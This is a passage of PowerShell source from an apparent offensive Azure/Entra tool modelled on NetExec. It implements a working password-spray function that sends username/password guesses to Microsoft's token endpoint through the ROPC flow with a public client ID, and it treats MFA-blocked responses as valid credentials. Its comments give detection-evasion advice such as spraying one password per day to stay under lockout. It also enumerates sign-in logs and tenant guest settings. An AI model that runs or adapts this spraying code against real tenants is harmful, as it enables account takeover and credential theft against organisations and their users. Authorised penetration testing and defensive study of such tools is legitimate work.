                    $result.CloudInstanceName = $openIdConfig.tenant_region_scope
                }
            }
        } catch {
            # OpenID might not be accessible for all tenants
        }
        
        # Method 3: Check realm discovery endpoint for B2B settings
        $realmUrl = "https://login.microsoftonline.com/common/userrealm/$testEmail`?api-version=2.0"
        try {
            $realmInfo = Invoke-RestMethod -Uri $realmUrl -Method Get -ErrorAction Stop
            
            if ($realmInfo) {
                $result.NameSpaceType = $realmInfo.NameSpaceType
                $result.DomainName = $realmInfo.DomainName
                $result.FederationType = $realmInfo.FederationBrandName
                $result.AuthUrl = $realmInfo.AuthUrl
                
                if ($realmInfo.NameSpaceType -eq "Managed") {
                    $result.IsFederated = $false
                    $result.AcceptsExternalUsers = $true  # Managed domains typically accept B2B
                } elseif ($realmInfo.NameSpaceType -eq "Federated") {
                    $result.IsFederated = $true
                    $result.AcceptsExternalUsers = $true  # Federated domains also support B2B
                } elseif ($realmInfo.NameSpaceType -eq "Unknown") {
                    # Unknown namespace might indicate external users are not accepted
                    $result.AcceptsExternalUsers = $false
                }
            }
        } catch {
            # Realm might not be accessible
        }
        
    } catch {
        $result.Error = $_.Exception.Message
        
        if ($_.Exception.Response.StatusCode -eq 400) {
            $result.TenantExists = $false
        }
    }
    
    return $result
}

# Test guest authentication with credentials (password spray style)
# ============================================
# PASSWORD SPRAY ATTACK - PHASE 2
# ============================================
# This function is Phase 2 of the password spray attack workflow
#
# FUNCTION: Test-GuestAuthentication
# PURPOSE: Validate username/password combinations using ROPC OAuth2 flow
# USAGE: Called by 'guest' command (.\azx.ps1 guest -UserFile users.txt -Password 'Pass123')
#
# HOW IT WORKS:
#   - Uses Resource Owner Password Credentials (ROPC) grant type
#   - Sends username/password directly to Azure AD token endpoint
#   - Returns detailed authentication result including:
#     * Success/failure status
#     * MFA requirements (valid creds even if MFA blocks)
#     * Account lockout detection
#     * Password expiration detection
#     * Access token (if successful)
#
# DETECTION & OPSEC:
#   - Generates Azure AD sign-in logs (failed authentication events)
#   - Multiple failed attempts may trigger account lockout
#   - Use delays between attempts (100ms default)
#   - Respect lockout thresholds (typically 5-10 failed attempts)
#   - For low-noise: spray 1 password per day across all users
#
# NETEXEC EQUIVALENT:
#   nxc smb 192.168.1.0/24 -u users.txt -p 'Password123'
#   .\azx.ps1 guest -Domain target.com -UserFile users.txt -Password 'Password123'
#
# ERROR CODES:
#   - AADSTS50126: Invalid username or password
#   - AADSTS50053: Account locked (too many failed attempts)
#   - AADSTS50055: Password expired
#   - AADSTS50076/50079: MFA required (credentials ARE VALID!)
#   - AADSTS65001: Consent required (credentials ARE VALID!)
#   - AADSTS50034: User not found
#   - AADSTS7000218: ROPC flow disabled
#
# IMPORTANT: If MFA or Consent is required, credentials are VALID but additional
#           steps are needed. These results should be treated as successful
#           credential validation for password spray purposes.
#
# ============================================
function Test-GuestAuthentication {
    param(
        [string]$Username,
        [string]$Password,
        [string]$TenantId = "common"
    )
    
    $result = [PSCustomObject]@{
        Username = $Username
        Success = $false
        ErrorCode = $null
        ErrorDescription = $null
        TokenType = $null
        AccessToken = $null
        MFARequired = $false
        AccountLocked = $false
        PasswordExpired = $false
        ConsentRequired = $false
    }
    
    try {
        # Use Resource Owner Password Credential (ROPC) flow to test credentials
        # Using Azure PowerShell client ID (known public client)
        $clientId = "1950a258-227b-4e31-a9cf-717495945fc2"  # Azure PowerShell
        $scope = "https://graph.microsoft.com/.default openid profile offline_access"
        
        $body = @{
            grant_type = "password"
            client_id = $clientId
            scope = $scope
            username = $Username
            password = $Password
        }
        
        $tokenUrl = "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token"
        
        $response = Invoke-RestMethod `
            -Method POST `
            -Uri $tokenUrl `
            -ContentType "application/x-www-form-urlencoded" `
            -Body $body `
            -ErrorAction Stop
        
        $result.Success = $true
        $result.TokenType = $response.token_type
        $result.AccessToken = $response.access_token
        
    } catch {
        $errorResponse = $null
        
        try {
            if ($_.Exception.Response) {
                $reader = [System.IO.StreamReader]::new($_.Exception.Response.GetResponseStream())
                $errorBody = $reader.ReadToEnd()
                $reader.Close()
                $errorResponse = $errorBody | ConvertFrom-Json
            }
        } catch {
            # Couldn't parse error response
        }
        
        if ($errorResponse) {
            $result.ErrorCode = $errorResponse.error
            $result.ErrorDescription = $errorResponse.error_description
            
            # Analyze error codes
            switch -Regex ($errorResponse.error_description) {
                "AADSTS50126" {
                    # Invalid username or password
                    $result.ErrorCode = "INVALID_CREDENTIALS"
                }
                "AADSTS50053" {
                    # Account locked
                    $result.AccountLocked = $true
                    $result.ErrorCode = "ACCOUNT_LOCKED"
                }
                "AADSTS50055" {
                    # Password expired
                    $result.PasswordExpired = $true
                    $result.ErrorCode = "PASSWORD_EXPIRED"
                }
                "AADSTS50076|AADSTS50079" {
                    # MFA required - credential is valid!
                    $result.MFARequired = $true
                    $result.Success = $true  # Credentials are valid, just need MFA
                    $result.ErrorCode = "MFA_REQUIRED"
                }
                "AADSTS65001" {
                    # Consent required
                    $result.ConsentRequired = $true
                    $result.Success = $true  # Credentials are valid
                    $result.ErrorCode = "CONSENT_REQUIRED"
                }
                "AADSTS50034" {
                    # User not found
                    $result.ErrorCode = "USER_NOT_FOUND"
                }
                "AADSTS50057" {
                    # Account disabled
                    $result.ErrorCode = "ACCOUNT_DISABLED"
                }
                "AADSTS50058" {
                    # Silent sign-in failed
                    $result.ErrorCode = "SILENT_SIGNIN_FAILED"
                }
                "AADSTS700016" {
                    # Application not found in tenant
                    $result.ErrorCode = "APP_NOT_FOUND"
                }
                "AADSTS7000218" {
                    # ROPC not allowed
                    $result.ErrorCode = "ROPC_DISABLED"
                }
                default {
                    $result.ErrorCode = $errorResponse.error
                }
            }
        } else {
            $result.ErrorDescription = $_.Exception.Message
        }
    }
    
    return $result
}

# Enumerate active Windows sessions (similar to nxc smb --qwinsta)
function Invoke-SessionEnumeration {
    param(
        [string]$Username,
        [string]$ExportPath,
        [int]$Hours = 24
    )
    
    Write-ColorOutput -Message "`n[*] AZX - Azure/Entra Active Session Enumeration" -Color "Yellow"
    Write-ColorOutput -Message "[*] Command: Sessions (Similar to: nxc smb --qwinsta)" -Color "Yellow"
    Write-ColorOutput -Message "[*] Querying sign-in logs for last $Hours hours..." -Color "Cyan"
    
    # Initialize connection context
    try {
        $context = Get-MgContext -ErrorAction SilentlyContinue
        
        if (-not $context) {
            Write-ColorOutput -Message "[!] Not authenticated to Microsoft Graph" -Color "Red"
            Write-ColorOutput -Message "[*] Attempting authentication..." -Color "Yellow"
            
            # Connect with required permissions
            $requiredScopes = "AuditLog.Read.All,Directory.Read.All"
            Connect-GraphAPI -Scopes $requiredScopes
            $context = Get-MgContext
        }
        
        if ($context) {
            Write-ColorOutput -Message "[+] Authenticated as: $($context.Account)" -Color "Green"
            
            # Check if current user is guest
            $isGuest = Test-IsGuestUser -UserPrincipalName $context.Account
            if ($isGuest) {
                Write-ColorOutput -Message "[!] Warning: Guest users typically have limited access to audit logs" -Color "Yellow"
            }
        }
    } catch {
        Write-ColorOutput -Message "[!] Failed to get authentication context: $($_.Exception.Message)" -Color "Red"
        return
    }
    
    # Calculate time filter
    $startTime = (Get-Date).AddHours(-$Hours).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
    
    Write-ColorOutput -Message "`n[*] ========================================" -Color "Cyan"
    Write-ColorOutput -Message "[*] ACTIVE SIGN-IN SESSIONS" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"
    
    $sessions = @()
    $uniqueUsers = @{}
    
    try {
        # Build filter query
        $filterQuery = "createdDateTime ge $startTime"
        if ($Username) {
            $filterQuery += " and userPrincipalName eq '$Username'"
        }
        
        # Query sign-in logs
        Write-ColorOutput -Message "[*] Querying Azure AD sign-in logs (this may take a moment)..." -Color "Cyan"
        
        $uri = "https://graph.microsoft.com/v1.0/auditLogs/signIns?`$filter=$filterQuery&`$top=999&`$orderby=createdDateTime desc"
        
        $allSignIns = @()
        do {
            $response = Invoke-MgGraphRequest -Uri $uri -Method GET -ErrorAction Stop
            $allSignIns += $response.value
            $uri = $response.'@odata.nextLink'
        } while ($uri)
        
        if ($allSignIns.Count -eq 0) {
            Write-ColorOutput -Message "[!] No sign-in events found in the last $Hours hours" -Color "Yellow"
            if ($Username) {
                Write-ColorOutput -Message "[!] No sign-ins found for user: $Username" -Color "Yellow"
            }
            return
        }
        
        Write-ColorOutput -Message "[+] Found $($allSignIns.Count) sign-in events" -Color "Green"
        Write-ColorOutput -Message ""
        
        # Process and display sessions
        foreach ($signIn in $allSignIns) {
            # Track unique users
            $userKey = $signIn.userPrincipalName
            if (-not $uniqueUsers.ContainsKey($userKey)) {
                $uniqueUsers[$userKey] = 0
            }
            $uniqueUsers[$userKey]++
            
            # Determine success/failure status
            $statusColor = if ($signIn.status.errorCode -eq 0) { "Green" } else { "Red" }
            $statusIcon = if ($signIn.status.errorCode -eq 0) { "+" } else { "!" }
            $statusText = if ($signIn.status.errorCode -eq 0) { "SUCCESS" } else { "FAILED" }
            
            # Format device info
            $deviceName = if ($signIn.deviceDetail.displayName) { 
                $signIn.deviceDetail.displayName 
            } else { 
                "Unknown Device" 
            }
            
            $deviceOS = if ($signIn.deviceDetail.operatingSystem) {
                $signIn.deviceDetail.operatingSystem
            } else {
                "Unknown OS"
            }
            
            # Format location
            $location = if ($signIn.location.city -and $signIn.location.countryOrRegion) {
                "$($signIn.location.city), $($signIn.location.countryOrRegion)"
            } elseif ($signIn.location.countryOrRegion) {
                $signIn.location.countryOrRegion
            } else {
                "Unknown Location"
            }
            
            # Format IP address
            $ipAddress = if ($signIn.ipAddress) { $signIn.ipAddress } else { "N/A" }
            
            # Format application
            $appName = if ($signIn.appDisplayName) { $signIn.appDisplayName } else { "Unknown App" }
            
            # Format timestamp
            $timestamp = ([DateTime]$signIn.createdDateTime).ToLocalTime().ToString("yyyy-MM-dd HH:mm:ss")
            
            # Risk level (if available)
            $riskLevel = if ($signIn.riskLevelDuringSignIn -and $signIn.riskLevelDuringSignIn -ne "none") {
                $signIn.riskLevelDuringSignIn.ToUpper()
            } else {
                $null
            }
            
            # MFA details
            $mfaRequired = $signIn.conditionalAccessStatus -eq "success" -or $signIn.authenticationRequirement -eq "multiFactorAuthentication"
            
            # Build session object
            $sessionObj = [PSCustomObject]@{
                Timestamp = $timestamp
                User = $signIn.userPrincipalName
                DisplayName = $signIn.userDisplayName
                Status = $statusText
                ErrorCode = $signIn.status.errorCode
                ErrorReason = $signIn.status.failureReason
                Application = $appName
                DeviceName = $deviceName
                OperatingSystem = $deviceOS
                Browser = $signIn.deviceDetail.browser
                IsCompliant = $signIn.deviceDetail.isCompliant
                IsManagedDevice = $signIn.deviceDetail.isManaged
                IPAddress = $ipAddress
                Location = $location
                RiskLevel = $riskLevel
                MFARequired = $mfaRequired
                ConditionalAccessStatus = $signIn.conditionalAccessStatus
                SessionId = $signIn.id
            }
            
            $sessions += $sessionObj
            
            # Display in netexec-style format
            # Handle null/empty userPrincipalName
            $displayUser = if ($signIn.userPrincipalName) { $signIn.userPrincipalName } else { $signIn.userDisplayName }
            if (-not $displayUser) { $displayUser = "Unknown User" }
            
            $userDisplay = $displayUser.PadRight(45)
            $ipDisplay = $ipAddress.PadRight(15)
            
            Write-ColorOutput -Message "AZR".PadRight(12) + $userDisplay + $ipDisplay + "[$statusIcon] $statusText" -Color $statusColor
            
            # Show display name if different from UPN
            if ($signIn.userDisplayName -and $signIn.userDisplayName -ne $displayUser) {
                Write-ColorOutput -Message "    Name:      $($signIn.userDisplayName)" -Color "DarkGray"
            }
            Write-ColorOutput -Message "    Time:      $timestamp" -Color "DarkGray"
            Write-ColorOutput -Message "    Device:    $deviceName ($deviceOS)" -Color "DarkGray"
            Write-ColorOutput -Message "    App:       $appName" -Color "DarkGray"
            Write-ColorOutput -Message "    Location:  $location" -Color "DarkGray"
            
            if ($mfaRequired) {
                Write-ColorOutput -Message "    MFA:       Required" -Color "Cyan"
            }
            
            if ($riskLevel) {
                $riskColor = switch ($riskLevel) {
                    "HIGH" { "Red" }
                    "MEDIUM" { "Yellow" }
                    default { "Cyan" }
                }
                Write-ColorOutput -Message "    Risk:      $riskLevel" -Color $riskColor
            }
            
            if ($signIn.status.errorCode -ne 0) {
                Write-ColorOutput -Message "    Error:     $($signIn.status.failureReason)" -Color "Red"
            }
            
            Write-ColorOutput -Message ""
        }
        
        # Summary statistics
        Write-ColorOutput -Message "`n[*] ========================================" -Color "Cyan"
        Write-ColorOutput -Message "[*] SESSION SUMMARY" -Color "Cyan"
        Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"
        
        $successCount = ($sessions | Where-Object { $_.Status -eq "SUCCESS" }).Count
        $failedCount = ($sessions | Where-Object { $_.Status -eq "FAILED" }).Count
        $uniqueUserCount = $uniqueUsers.Count
        $mfaCount = ($sessions | Where-Object { $_.MFARequired -eq $true }).Count
        $riskyCount = ($sessions | Where-Object { $_.RiskLevel -ne $null }).Count
        
        Write-ColorOutput -Message "AZR".PadRight(12) + "Total Sign-ins:      $($sessions.Count)" -Color "Cyan"
        Write-ColorOutput -Message "AZR".PadRight(12) + "Unique Users:        $uniqueUserCount" -Color "Cyan"
        Write-ColorOutput -Message "AZR".PadRight(12) + "Successful:          $successCount" -Color "Green"
        if ($failedCount -gt 0) {
            Write-ColorOutput -Message "AZR".PadRight(12) + "Failed:              $failedCount" -Color "Red"
        }
        if ($mfaCount -gt 0) {
            Write-ColorOutput -Message "AZR".PadRight(12) + "MFA Protected:       $mfaCount" -Color "Cyan"
        }
        if ($riskyCount -gt 0) {
            Write-ColorOutput -Message "AZR".PadRight(12) + "Risky Sign-ins:      $riskyCount" -Color "Yellow"
        }
        
        # Top users
        if ($uniqueUsers.Count -gt 1) {
            Write-ColorOutput -Message "`n[*] Top Active Users:" -Color "Yellow"
            $topUsers = $uniqueUsers.GetEnumerator() | Sort-Object -Property Value -Descending | Select-Object -First 5
            foreach ($user in $topUsers) {
                Write-ColorOutput -Message "    $($user.Name): $($user.Value) sign-ins" -Color "DarkGray"
            }
        }
        
        # Top applications
        $appCounts = @{}
        foreach ($session in $sessions) {
            if (-not $appCounts.ContainsKey($session.Application)) {
                $appCounts[$session.Application] = 0
            }
            $appCounts[$session.Application]++
        }
        
        if ($appCounts.Count -gt 0) {
            Write-ColorOutput -Message "`n[*] Top Applications:" -Color "Yellow"
            $topApps = $appCounts.GetEnumerator() | Sort-Object -Property Value -Descending | Select-Object -First 5
            foreach ($app in $topApps) {
                Write-ColorOutput -Message "    $($app.Name): $($app.Value) sign-ins" -Color "DarkGray"
            }
        }
        
        # Export if requested
        if ($ExportPath) {
            try {
                $extension = [System.IO.Path]::GetExtension($ExportPath).ToLower()
                
                if ($extension -eq ".csv") {
                    $sessions | Export-Csv -Path $ExportPath -NoTypeInformation -Force
                } elseif ($extension -eq ".json") {
                    $sessions | ConvertTo-Json -Depth 10 | Out-File -FilePath $ExportPath -Force
                } else {
                    # Default to JSON
                    $sessions | ConvertTo-Json -Depth 10 | Out-File -FilePath $ExportPath -Force
                }
                
                Write-ColorOutput -Message "`n[+] Session data exported to: $ExportPath" -Color "Green"
            } catch {
                Write-ColorOutput -Message "`n[!] Failed to export results: $_" -Color "Red"
            }
        }
        
        Write-ColorOutput -Message "`n[*] Session enumeration complete!" -Color "Green"
        
    } catch {
        # Check if it's a permission error
        if ($_.Exception.Message -like "*403*" -or $_.Exception.Message -like "*Forbidden*" -or $_.Exception.Message -like "*Insufficient privileges*") {
            Write-ColorOutput -Message "[!] Access Denied: Insufficient permissions to read sign-in logs" -Color "Red"
            Write-ColorOutput -Message "[*] Required permissions: AuditLog.Read.All or Directory.Read.All" -Color "Yellow"
            Write-ColorOutput -Message "[*] Guest users typically cannot access audit logs" -Color "Yellow"
        } else {
            Write-ColorOutput -Message "[!] Failed to enumerate sessions" -Color "Red"
            Write-ColorOutput -Message "[!] Error: $($_.Exception.Message)" -Color "Red"
        }
    }
    
    return $sessions
}

# Main guest enumeration function
function Invoke-GuestEnumeration {
    param(
        [string]$Domain,
        [string]$Username,
        [string]$Password,
        [string]$UserFile,
        [string]$ExportPath
    )
    
    Write-ColorOutput -Message "`n[*] AZX - Azure/Entra Guest Login Enumeration" -Color "Yellow"
    Write-ColorOutput -Message "[*] Command: Guest Enumeration (Similar to: nxc smb -u 'a' -p '')" -Color "Yellow"
    
    # Auto-detect domain if not provided
    if (-not $Domain) {
        Write-ColorOutput -Message "[*] No domain specified, attempting to auto-detect..." -Color "Yellow"
        
        $detectedDomain = $null
        
        # Method 1: Try to extract from username if provided
        if ($Username -and $Username -like "*@*") {
            $detectedDomain = ($Username -split "@")[1]
            Write-ColorOutput -Message "[+] Detected domain from username: $detectedDomain" -Color "Green"
        }
        
        # Method 2: Try to get UPN from whoami command (Windows)
        if (-not $detectedDomain) {
            try {
                if ($IsWindows -or $PSVersionTable.PSVersion.Major -le 5) {
                    $upn = whoami /upn 2>$null
                    if ($upn -and $upn -match '@(.+)$') {
                        $detectedDomain = $matches[1]
                        Write-ColorOutput -Message "[+] Detected domain from UPN: $detectedDomain" -Color "Green"
                    }
                }
            } catch {
                # Silent catch
            }
        }
        
        # Method 3: Try environment variable for USERDNSDOMAIN
        if (-not $detectedDomain) {
            $envDomain = [System.Environment]::GetEnvironmentVariable("USERDNSDOMAIN")
            if ($envDomain) {
                $detectedDomain = $envDomain
                Write-ColorOutput -Message "[+] Detected domain from environment: $detectedDomain" -Color "Green"
            }
        }
        
        if ($detectedDomain) {
            $Domain = $detectedDomain
            Write-ColorOutput -Message "[+] Using auto-detected domain: $Domain`n" -Color "Green"
        } else {
            Write-ColorOutput -Message "[!] Could not auto-detect domain" -Color "Red"
            Write-ColorOutput -Message "[!] Please provide the domain using: -Domain example.com" -Color "Yellow"
            Write-ColorOutput -Message "[!] Or provide a full email username: -Username user@example.com" -Color "Yellow"
            return
        }
    }
    
    Write-ColorOutput -Message "[*] Target Domain: $Domain" -Color "Yellow"
    Write-ColorOutput -Message "[*] Method: ROPC Authentication Testing`n" -Color "Yellow"
    
    # Phase 1: Check if tenant accepts external/guest authentication (unauthenticated)
    Write-ColorOutput -Message "[*] Phase 1: Checking tenant guest configuration (unauthenticated)..." -Color "Yellow"
    
    $guestConfig = Test-GuestLoginEnabled -Domain $Domain
    
    # Format output like nxc
    if ($guestConfig.TenantExists) {
        Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[+] Tenant exists" -Color "Green"
        
        if ($guestConfig.NameSpaceType) {
            $nsColor = if ($guestConfig.NameSpaceType -eq "Managed") { "Cyan" } else { "Yellow" }
            Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[*] NameSpaceType: $($guestConfig.NameSpaceType)" -Color $nsColor
        }
        
        if ($guestConfig.IsFederated) {
            Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[*] Federation: Enabled ($($guestConfig.FederationType))" -Color "Yellow"
            if ($guestConfig.AuthUrl) {
                Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[*] Auth URL: $($guestConfig.AuthUrl)" -Color "DarkGray"
            }
        } else {
            Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[*] Federation: Managed (Cloud-only)" -Color "Cyan"
        }
        
        if ($guestConfig.AcceptsExternalUsers) {
            Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[+] External/Guest users: Likely ENABLED (B2B)" -Color "Green"
        }
    } else {
        Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + "[-] Tenant not found or not accessible" -Color "Red"
        return
    }
    
    Write-ColorOutput -Message ""
    
    # Phase 2: Test authentication if credentials provided
    if ($Username -or $UserFile) {
        Write-ColorOutput -Message "[*] Phase 2: Testing guest authentication..." -Color "Yellow"
        
        $credentialsToTest = @()
        $results = @()
        
        # Single username/password test
        if ($Username) {
            if ($Username -notlike "*@*") {
                $Username = "$Username@$Domain"
            }
            $credentialsToTest += @{
                Username = $Username
                Password = if ($Password) { $Password } else { "" }
            }
        }
        
        # Load from file
        if ($UserFile) {
            if (-not (Test-Path $UserFile)) {
                Write-ColorOutput -Message "[!] User file not found: $UserFile" -Color "Red"
            } else {
                try {
                    $fileContent = Get-Content $UserFile -ErrorAction Stop
                    foreach ($line in $fileContent) {
                        $line = $line.Trim()
                        if ($line -and $line -notlike "#*") {
                            # Format: username:password or just username
                            if ($line -like "*:*") {
                                $parts = $line -split ":", 2
                                $user = $parts[0].Trim()
                                $pass = $parts[1]
                            } else {
                                $user = $line
                                $pass = if ($Password) { $Password } else { "" }
                            }
                            
                            if ($user -notlike "*@*") {
                                $user = "$user@$Domain"
                            }
                            
                            $credentialsToTest += @{
                                Username = $user
                                Password = $pass
                            }
                        }
                    }
                    Write-ColorOutput -Message "[*] Loaded $($credentialsToTest.Count) credential(s) from file" -Color "Green"
                } catch {
                    Write-ColorOutput -Message "[!] Failed to read user file: $_" -Color "Red"
                }
            }
        }
        
        Write-ColorOutput -Message "[*] Testing $($credentialsToTest.Count) credential(s)...`n" -Color "Yellow"
        
        foreach ($cred in $credentialsToTest) {
            $authResult = Test-GuestAuthentication -Username $cred.Username -Password $cred.Password -TenantId $Domain
            
            $displayUser = $cred.Username
            if ($displayUser.Length -gt 35) {
                $displayUser = $displayUser.Substring(0, 32) + "..."
            }
            
            $passDisplay = if ($cred.Password -eq "") { "(empty)" } else { "(password)" }
            
            if ($authResult.Success) {
                if ($authResult.MFARequired) {
                    # Valid creds but MFA needed
                    Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + $displayUser.PadRight(38) + "[+] Valid credentials - MFA REQUIRED" -Color "Yellow"
                } elseif ($authResult.ConsentRequired) {
                    # Valid creds but consent needed
                    Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + $displayUser.PadRight(38) + "[+] Valid credentials - CONSENT REQUIRED" -Color "Yellow"
                } else {
                    # Full success - we got a token!
                    Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + $displayUser.PadRight(38) + "[+] SUCCESS! Got access token $passDisplay" -Color "Green"
                }
                
                $results += [PSCustomObject]@{
                    Username = $cred.Username
                    Password = $cred.Password
                    Success = $true
                    MFARequired = $authResult.MFARequired
                    ConsentRequired = $authResult.ConsentRequired
                    ErrorCode = $authResult.ErrorCode
                    HasToken = ($null -ne $authResult.AccessToken)
                }
            } else {
                # Authentication failed
                $errorMsg = switch ($authResult.ErrorCode) {
                    "INVALID_CREDENTIALS" { "[-] Invalid credentials" }
                    "USER_NOT_FOUND" { "[-] User not found" }
                    "ACCOUNT_LOCKED" { "[!] ACCOUNT LOCKED" }
                    "ACCOUNT_DISABLED" { "[-] Account disabled" }
                    "PASSWORD_EXPIRED" { "[!] PASSWORD EXPIRED (valid user)" }
                    "ROPC_DISABLED" { "[!] ROPC disabled (try device code flow)" }
                    "APP_NOT_FOUND" { "[-] Application not found in tenant" }
                    default { "[-] Failed: $($authResult.ErrorCode)" }
                }
                
                $errorColor = if ($authResult.AccountLocked -or $authResult.PasswordExpired) { "Yellow" } else { "DarkGray" }
                
                Write-ColorOutput -Message "AZR".PadRight(12) + $Domain.PadRight(35) + "443".PadRight(7) + $displayUser.PadRight(38) + $errorMsg -Color $errorColor
                
                $results += [PSCustomObject]@{
                    Username = $cred.Username
                    Password = $cred.Password
                    Success = $false
                    MFARequired = $authResult.MFARequired
                    ConsentRequired = $authResult.ConsentRequired
                    ErrorCode = $authResult.ErrorCode
                    HasToken = $false
                }
            }
            
            # Small delay to avoid lockouts
            Start-Sleep -Milliseconds 100
        }
        
        # Summary
        $successCount = ($results | Where-Object { $_.Success }).Count
        $mfaCount = ($results | Where-Object { $_.MFARequired }).Count
        $lockedCount = ($results | Where-Object { $_.ErrorCode -eq "ACCOUNT_LOCKED" }).Count
        
        Write-ColorOutput -Message "`n[*] Authentication Test Summary:" -Color "Yellow"
        Write-ColorOutput -Message "    Total Tested:    $($results.Count)" -Color "Cyan"
        Write-ColorOutput -Message "    Valid Creds:     $successCount" -Color $(if ($successCount -gt 0) { "Green" } else { "DarkGray" })
        Write-ColorOutput -Message "    MFA Required:    $mfaCount" -Color $(if ($mfaCount -gt 0) { "Yellow" } else { "DarkGray" })
        Write-ColorOutput -Message "    Accounts Locked: $lockedCount" -Color $(if ($lockedCount -gt 0) { "Red" } else { "DarkGray" })
        
        # Export if requested
        if ($ExportPath) {
            try {
                $extension = [System.IO.Path]::GetExtension($ExportPath).ToLower()
                
                $exportData = [PSCustomObject]@{
                    Domain = $Domain
                    TenantConfig = $guestConfig
                    AuthResults = $results
                    Summary = @{
                        TotalTested = $results.Count
                        ValidCredentials = $successCount
                        MFARequired = $mfaCount
                        LockedAccounts = $lockedCount
                    }
                }
                
                if ($extension -eq ".csv") {
                    $results | Export-Csv -Path $ExportPath -NoTypeInformation -Force
                } elseif ($extension -eq ".json") {
                    $exportData | ConvertTo-Json -Depth 10 | Out-File -FilePath $ExportPath -Force
                } else {
                    $exportData | ConvertTo-Json -Depth 10 | Out-File -FilePath $ExportPath -Force
                }
                
                Write-ColorOutput -Message "`n[+] Results exported to: $ExportPath" -Color "Green"
            } catch {
                Write-ColorOutput -Message "`n[!] Failed to export results: $_" -Color "Red"
            }
        }
        
        # If we got valid credentials, offer to enumerate as guest
        $validCreds = $results | Where-Object { $_.Success -and -not $_.MFARequired -and $_.HasToken }
        if ($validCreds) {
            Write-ColorOutput -Message "`n[*] Valid credentials found! You can now enumerate as a guest user:" -Color "Green"
            Write-ColorOutput -Message "    .\azx.ps1 hosts   # Enumerate devices" -Color "Cyan"
            Write-ColorOutput -Message "    .\azx.ps1 groups  # Enumerate groups" -Color "Cyan"
            Write-ColorOutput -Message "    .\azx.ps1 pass-pol # Check password policies`n" -Color "Cyan"
        }
        
    } else {
        # No credentials provided - just show what's accessible without auth
        Write-ColorOutput -Message "[*] No credentials provided. Testing unauthenticated access..." -Color "Yellow"
        Write-ColorOutput -Message "[*] To test guest authentication, use:" -Color "Yellow"
        Write-ColorOutput -Message "    .\azx.ps1 guest -Domain $Domain -Username user@domain.com -Password 'pass'" -Color "Cyan"
        Write-ColorOutput -Message "    .\azx.ps1 guest -Domain $Domain -Username user -Password ''  # Empty password test" -Color "Cyan"
        Write-ColorOutput -Message "    .\azx.ps1 guest -Domain $Domain -UserFile users.txt -Password 'Summer2024!'" -Color "Cyan"
        Write-ColorOutput -Message "`n[*] File format (one per line):" -Color "Yellow"
        Write-ColorOutput -Message "    username                 # Uses -Password for all" -Color "DarkGray"
        Write-ColorOutput -Message "    username:password        # Specific password per user" -Color "DarkGray"
        Write-ColorOutput -Message "    user@domain.com          # Full UPN" -Color "DarkGray"
        Write-ColorOutput -Message "    user@domain.com:password # Full UPN with password`n" -Color "DarkGray"
    }
    
    Write-ColorOutput -Message "[*] Guest enumeration complete!" -Color "Green"
}

# Tenant discovery function
function Invoke-TenantDiscovery {
    param(
        [string]$Domain,
        [string]$ExportPath
    )
    
    # Auto-detect domain if not provided
    if (-not $Domain) {
        Write-ColorOutput -Message "[*] No domain specified, attempting to auto-detect..." -Color "Yellow"
        
        # Try to get the domain from the current user's UPN
        $detectedDomain = $null
        
        try {
            # Method 1: Try to get UPN from whoami command (Windows)
            if ($IsWindows -or $PSVersionTable.PSVersion.Major -le 5) {
                $upn = whoami /upn 2>$null
                if ($upn -and $upn -match '@(.+)$') {
                    $detectedDomain = $matches[1]
                    Write-ColorOutput -Message "[+] Detected domain from UPN: $detectedDomain" -Color "Green"
                }
            }
            
            # Method 2: Try environment variable for USERDNSDOMAIN
            if (-not $detectedDomain) {
                $envDomain = [System.Environment]::GetEnvironmentVariable("USERDNSDOMAIN")
                if ($envDomain) {
                    $detectedDomain = $envDomain
                    Write-ColorOutput -Message "[+] Detected domain from environment: $detectedDomain" -Color "Green"
                }
            }
            
            # Method 3: Try to get domain from current user's email-like username
            if (-not $detectedDomain) {
                $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
                if ($currentUser -match '@(.+)$') {
                    $detectedDomain = $matches[1]
                    Write-ColorOutput -Message "[+] Detected domain from username: $detectedDomain" -Color "Green"
                } elseif ($currentUser -match '(.+)\\') {
                    $domainName = $matches[1]
                    # Check if it's not a local machine name by checking if it looks like a NETBIOS name
                    if ($domainName -ne $env:COMPUTERNAME -and $domainName.Length -le 15) {
                        Write-ColorOutput -Message "[*] Detected NETBIOS domain: $domainName" -Color "Yellow"
                        Write-ColorOutput -Message "[!] Please provide the full DNS domain name for tenant discovery" -Color "Yellow"
                    }
                }
            }
        } catch {
            # Silent catch - we'll handle the error below
        }
        
        if ($detectedDomain) {
            $Domain = $detectedDomain
            Write-ColorOutput -Message "[+] Using auto-detected domain: $Domain`n" -Color "Green"
        } else {
            Write-ColorOutput -Message "[!] Could not auto-detect domain" -Color "Red"
            Write-ColorOutput -Message "[!] Please provide the domain using: .\azx.ps1 tenant -Domain example.com" -Color "Yellow"
            return
        }
    }
    
    Write-ColorOutput -Message "`n[*] AZX - Azure/Entra Tenant Discovery" -Color "Yellow"
    Write-ColorOutput -Message "[*] Target Domain: $Domain`n" -Color "Yellow"
    
    # Construct the OpenID configuration URLs
    $openIdConfigUrl = "https://login.microsoftonline.com/$Domain/.well-known/openid-configuration"
    $commonOpenIdConfigUrl = "https://login.microsoftonline.com/common/v2.0/.well-known/openid-configuration"
    
